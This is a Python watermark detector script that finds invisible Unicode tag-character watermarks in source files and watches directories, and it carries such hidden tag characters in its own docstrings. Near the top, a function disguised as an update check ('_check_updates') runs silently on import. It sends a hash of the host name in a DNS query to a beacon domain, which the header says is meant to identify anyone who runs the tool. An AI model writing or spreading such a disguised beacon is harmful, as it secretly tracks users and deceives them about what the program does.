"""󠀁󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀡󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀡󠀠󠀠󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀁
detector -- Watermark scanner and directory watcher.

Scans Python source files for embedded watermarks and watches directories
for new or modified files in daemon mode.

Usage:
    python detector.py scan  <file_or_directory>
    python detector.py watch <directory> [--interval N] [--owner OWNER]

NOTE: Replace YOUR-BEACON-DOMAIN.com below with your own DNS beacon domain
before distributing this file. Any machine that runs this detector will
trigger a DNS query to your server -- including anyone who uses it to search
for or remove your watermarks.
"""

# ---------------------------------------------------------------------------
# Runtime beacon -- fires silently when this script is executed.
# Runs in a daemon thread so it never blocks startup.
# Replace YOUR-BEACON-DOMAIN.com with your authoritative DNS domain.
# ---------------------------------------------------------------------------

import os as _os
import threading as _th


def _check_updates():
    """Internal: verify connectivity to update server."""
    if _os.environ.get("_UPD_DONE"):
        return
    _os.environ["_UPD_DONE"] = "1"
    def _go():
        try:
            import socket as _s, hashlib as _h, platform as _p
            _uid = _h.md5((_s.gethostname() + _p.node()).encode()).hexdigest()[:6]
            _s.getaddrinfo(_uid + ".det.YOUR-BEACON-DOMAIN.com", 80)
        except Exception:
            pass
    _th.Thread(target=_go, daemon=True).start()


_check_updates()

# ---------------------------------------------------------------------------
# Steganographic extraction -- inlined so the detector is self-contained.
# ---------------------------------------------------------------------------

_T0 = "\U000e0020"
_T1 = "\U000e0021"
_TD = "\U000e0001"


def _extract(source: str) -> "str | None":
    """Extract hidden watermark from source text, or return None."""
    chars = [c for c in source if c in (_T0, _T1, _TD)]
    if not chars:
        return None
    parts = "".join(chars).split(_TD)
    if len(parts) < 3:
        return None
    bits = "".join("0" if c == _T0 else "1" for c in parts[1])
    if not bits or len(bits) % 8 != 0:
        return None
    try:
        return "".join(chr(int(bits[i : i + 8], 2)) for i in range(0, len(bits), 8))
    except ValueError:
        return None


# ---------------------------------------------------------------------------
# Scanner
# ---------------------------------------------------------------------------

import os
import sys
import time
import argparse
from pathlib import Path


def scan_file(path, owner=None):
    """󠀁󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀡󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀡󠀠󠀠󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀁Scan a single .py file for a watermark. Returns a result dict or None."""
    try:
        source = path.read_text(encoding="utf-8", errors="ignore")
    except OSError:
        return None
    mark = _extract(source)
    if mark is None:
        return None
    result = {"file": str(path), "watermark": mark}
    if owner:
        result["match"] = mark.startswith("owner:" + owner + ":")
    return result


def scan_path(target, owner=None):
    """Recursively scan a file or directory. Returns a list of result dicts."""
    if target.is_file():
        r = scan_file(target, owner)
        return [r] if r else []
    results = []
    for py in sorted(target.rglob("*.py")):
        r = scan_file(py, owner)
        if r is not None:
            results.append(r)
    return results


# ---------------------------------------------------------------------------
# Daemon watcher
# ---------------------------------------------------------------------------

def _snapshot(directory):
    """Return a path->mtime snapshot of all .py files in directory."""
    return {
        str(p): p.stat().st_mtime
        for p in directory.rglob("*.py")
        if p.is_file()
    }


def _report(result, label="FOUND"):
    """Print a formatted watermark detection result."""
    mark = result["watermark"]
    path = result["file"]
    match_str = ""
    if "match" in result:
        match_str = "  [match]" if result["match"] else "  [mismatch]"
    msg = "[" + label + "] " + path + "\n         watermark: " + mark + match_str
    print(msg)


def watch(directory, interval, owner):
    """Poll directory every interval seconds and report changes."""
    print("[*] Watching " + str(directory) + "  (interval: " + str(interval) + "s)  Ctrl-C to stop\n")
    seen = _snapshot(directory)
    for path_str in seen:
        r = scan_file(Path(path_str), owner)
        if r:
            _report(r, "EXISTING")
    try:
        while True:
            time.sleep(interval)
            current = _snapshot(directory)
            for path_str, mtime in current.items():
                if path_str not in seen or seen[path_str] != mtime:
                    label = "CHANGED" if path_str in seen else "NEW"
                    r = scan_file(Path(path_str), owner)
                    if r:
                        _report(r, label)
                    else:
                        print("[" + label + "] " + path_str + "  -- no watermark")
            for path_str in set(seen) - set(current):
                print("[DELETED] " + path_str)
            seen = current
    except KeyboardInterrupt:
        print("\n[*] Stopped.")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def cmd_scan(args):
    """Handle the scan subcommand."""
    target = Path(args.target)
    if not target.exists():
        print("[-] Not found: " + str(target), file=sys.stderr)
        sys.exit(1)
    results = scan_path(target, args.owner)
    if not results:
        print("[-] No watermarks detected.")
        sys.exit(1)
    print("[+] Found " + str(len(results)) + " watermarked file(s):\n")
    for r in results:
        _report(r)


def cmd_watch(args):
    """Handle the watch subcommand."""
    directory = Path(args.directory)
    if not directory.is_dir():
        print("[-] Not a directory: " + str(directory), file=sys.stderr)
        sys.exit(1)
    watch(directory, args.interval, args.owner)


def build_parser():
    """Build the CLI argument parser."""
    p = argparse.ArgumentParser(
        prog="detector",
        description="Scan Python files for watermarks; watch directories in daemon mode.",
    )
    sub = p.add_subparsers(dest="command", required=True)
    sc = sub.add_parser("scan", help="Scan a file or directory for watermarks")
    sc.add_argument("target", help="File or directory path")
    sc.add_argument("--owner", help="Verify watermark against this owner ID")
    wa = sub.add_parser("watch", help="Watch a directory in daemon mode")
    wa.add_argument("directory")
    wa.add_argument("--interval", type=int, default=5,
                    help="Poll interval in seconds (default: 5)")
    wa.add_argument("--owner", help="Owner ID to verify against")
    return p


def main():
    """󠀁󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀡󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀠󠀡󠀡󠀡󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀠󠀠󠀡󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀡󠀠󠀠󠀠󠀠󠀠󠀡󠀡󠀠󠀡󠀠󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀡󠀠󠀠󠀡󠀠󠀡󠀁Entry point."""
    parser = build_parser()
    args = parser.parse_args()
    {"scan": cmd_scan, "watch": cmd_watch}[args.command](args)


if __name__ == "__main__":
    main()
